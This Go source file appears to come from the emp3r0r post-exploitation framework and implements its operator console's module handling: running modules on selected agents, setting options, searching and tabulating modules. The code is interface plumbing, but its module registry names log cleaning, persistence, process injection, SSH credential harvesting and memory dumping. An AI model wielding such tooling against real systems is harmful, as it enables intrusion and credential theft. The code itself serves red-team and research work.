package modules

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/runtime_def"
	"github.com/jm33-m0/emp3r0r/core/internal/cli"
	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/internal/logging"
	"github.com/jm33-m0/emp3r0r/core/internal/util"
	"github.com/lithammer/fuzzysearch/fuzzy"
	"github.com/olekukonko/tablewriter"
	"github.com/spf13/cobra"
)

var (
	// ShellHelpInfo provide utilities like ps, kill, etc
	// deprecated
	ShellHelpInfo = map[string]string{
		"#ps":   "List processes: `ps`",
		"#kill": "Kill process: `kill <PID>`",
		"#net":  "Show network info",
		"put":   "Put a file from CC to agent: `put <local file> <remote path>`",
		"get":   "Get a file from agent: `get <remote file>`",
	}

	// ModuleHelpers a map of module helpers
	ModuleHelpers = map[string]func(){
		emp3r0r_def.ModCMD_EXEC:     moduleCmd,
		emp3r0r_def.ModSHELL:        moduleShell,
		emp3r0r_def.ModPROXY:        moduleProxy,
		emp3r0r_def.ModPORT_FWD:     modulePortFwd,
		emp3r0r_def.ModLPE_SUGGEST:  moduleLPE,
		emp3r0r_def.ModCLEAN_LOG:    moduleLogCleaner,
		emp3r0r_def.ModPERSISTENCE:  modulePersistence,
		emp3r0r_def.ModVACCINE:      moduleVaccine,
		emp3r0r_def.ModINJECTOR:     moduleInjector,
		emp3r0r_def.ModBring2CC:     moduleBring2CC,
		emp3r0r_def.ModListener:     modListener,
		emp3r0r_def.ModSSHHarvester: module_ssh_harvester,
		emp3r0r_def.ModDownloader:   moduleDownloader,
		emp3r0r_def.ModFileServer:   moduleFileServer,
		emp3r0r_def.ModMemDump:      moduleMemDump,
	}
)

// UpdateOptions reads options from modules config, and set default values
func UpdateOptions(modName string) (exist bool) {
	// filter user supplied option
	for mod := range ModuleHelpers {
		if mod == modName {
			exist = true
			break
		}
	}
	if !exist {
		logging.Errorf("UpdateOptions: no such module: %s", modName)
		return
	}

	// help us add new options
	addIfNotFound := func(modOpt *emp3r0r_def.ModOption) {
		if _, exist := runtime_def.AvailableModuleOptions[modOpt.Name]; !exist {
			logging.Debugf("UpdateOptions: adding %s", modOpt.Name)
			runtime_def.AvailableModuleOptions[modOpt.Name] = modOpt
		}
	}

	modconfig := emp3r0r_def.Modules[modName]
	for optName, option := range modconfig.Options {
		argOpt := modconfig.Options[optName]
		if len(option.Vals) == 0 && option.Val != "" {
			argOpt.Vals = []string{option.Val}
		}
		addIfNotFound(argOpt)
	}
	if strings.ToLower(modconfig.AgentConfig.Exec) != "built-in" && !modconfig.IsLocal {
		logging.Debugf("UpdateOptions: module %s is not built-in, adding download_addr", modName)
		download_addr := &emp3r0r_def.ModOption{
			Name: "download_addr",
			Desc: "Download URL for this module, useful when you want to use an agent as caching server",
			Val:  "",
			Vals: []string{},
		}
		addIfNotFound(download_addr)
	}

	return
}

// ModuleRun run current module
func ModuleRun(_ *cobra.Command, _ []string) {
	modObj := emp3r0r_def.Modules[runtime_def.ActiveModule]
	if modObj == nil {
		logging.Errorf("ModuleRun: module %s not found", strconv.Quote(runtime_def.ActiveModule))
		return
	}
	if runtime_def.ActiveAgent != nil {
		target_os := runtime_def.ActiveAgent.GOOS
		mod_os := strings.ToLower(modObj.Platform)
		if mod_os != "generic" && target_os != mod_os {
			logging.Errorf("ModuleRun: module %s does not support %s", strconv.Quote(runtime_def.ActiveModule), target_os)
			return
		}
	}

	// is a target needed?
	if runtime_def.ActiveAgent == nil && !modObj.IsLocal {
		logging.Errorf("Target not specified")
		return
	}

	// check if target exists
	if runtime_def.AgentControlMap[runtime_def.ActiveAgent] == nil && runtime_def.ActiveAgent != nil {
		logging.Errorf("Target (%s) does not exist", runtime_def.ActiveAgent.Tag)
		return
	}

	// run module
	mod := ModuleHelpers[runtime_def.ActiveModule]
	if mod != nil {
		go mod()
	} else {
		logging.Errorf("Module %s not found", strconv.Quote(runtime_def.ActiveModule))
	}
}

// search modules, powered by fuzzysearch
func ModuleSearch(cmd *cobra.Command, args []string) {
	keyword := args[0]
	search_targets := new([]string)
	for name, mod_config := range emp3r0r_def.Modules {
		*search_targets = append(*search_targets, fmt.Sprintf("%s: %s", name, mod_config.Comment))
	}
	result := fuzzy.Find(keyword, *search_targets)

	// render results
	search_results := make(map[string]string)
	for _, r := range result {
		r_split := strings.Split(r, ": ")
		if len(r_split) == 2 {
			search_results[r_split[0]] = r_split[1]
		}
	}
	cli.CliPrettyPrint("Module", "Comment", &search_results)
}

// CmdListModOptionsTable list currently available options for `set`, in a table
func CmdListModOptionsTable(_ *cobra.Command, _ []string) {
	if runtime_def.ActiveModule == "none" {
		logging.Warningf("No module selected")
		return
	}
	runtime_def.AgentControlMapMutex.RLock()
	defer runtime_def.AgentControlMapMutex.RUnlock()
	opts := make(map[string]string)

	opts["module"] = runtime_def.ActiveModule
	if runtime_def.ActiveAgent != nil {
		_, exist := runtime_def.AgentControlMap[runtime_def.ActiveAgent]
		if exist {
			shortName := strings.Split(runtime_def.ActiveAgent.Tag, "-agent")[0]
			opts["target"] = shortName
		} else {
			opts["target"] = "<blank>"
		}
	} else {
		opts["target"] = "<blank>"
	}

	for opt_name, opt := range runtime_def.AvailableModuleOptions {
		if opt != nil {
			opts[opt_name] = opt.Name
		}
	}

	// build table
	tdata := [][]string{}
	tableString := &strings.Builder{}
	table := tablewriter.NewWriter(tableString)
	table.SetHeader([]string{"Option", "Help", "Value"})
	table.SetBorder(true)
	table.SetRowLine(true)
	table.SetAutoWrapText(true)
	table.SetColWidth(50)

	// color
	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})
	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor})

	// fill table
	module_obj := emp3r0r_def.Modules[runtime_def.ActiveModule]
	if module_obj == nil {
		logging.Errorf("Module %s not found", runtime_def.ActiveModule)
		return
	}
	for opt_name, opt_obj := range runtime_def.AvailableModuleOptions {
		help := "N/A"
		if opt_obj == nil {
			continue
		}
		help = opt_obj.Desc
		switch opt_name {
		case "module":
			help = "Selected module"
		case "target":
			help = "Selected target"
		}
		val := ""
		currentOpt, ok := runtime_def.AvailableModuleOptions[opt_name]
		if ok {
			val = currentOpt.Val
		}

		tdata = append(tdata,
			[]string{
				util.SplitLongLine(opt_name, 50),
				util.SplitLongLine(help, 50),
				util.SplitLongLine(val, 50),
			})
	}
	table.AppendBulk(tdata)
	table.Render()
	out := tableString.String()
	cli.AdaptiveTable(out)
	logging.Printf("\n%s", out)
}

// CmdSetOptVal set an option to value: `set` command
func CmdSetOptVal(cmd *cobra.Command, args []string) {
	opt := args[0]
	val := args[1]
	// hand to SetOption helper
	runtime_def.SetOption(opt, val)
	CmdListModOptionsTable(cmd, args)
}

// SetActiveModule set the active module to use: `use` command
func CmdSetActiveModule(cmd *cobra.Command, args []string) {
	modName := args[0]
	for mod := range ModuleHelpers {
		if mod == modName {
			runtime_def.ActiveModule = modName
			for k := range runtime_def.AvailableModuleOptions {
				delete(runtime_def.AvailableModuleOptions, k)
			}
			UpdateOptions(runtime_def.ActiveModule)
			logging.Infof("Using module %s", strconv.Quote(runtime_def.ActiveModule))
			ModuleDetails(runtime_def.ActiveModule)
			mod, exists := emp3r0r_def.Modules[runtime_def.ActiveModule]
			if exists {
				logging.Printf("%s", mod.Comment)
			}
			CmdListModOptionsTable(cmd, args)

			return
		}
	}
	logging.Errorf("No such module: %s", strconv.Quote(modName))
}
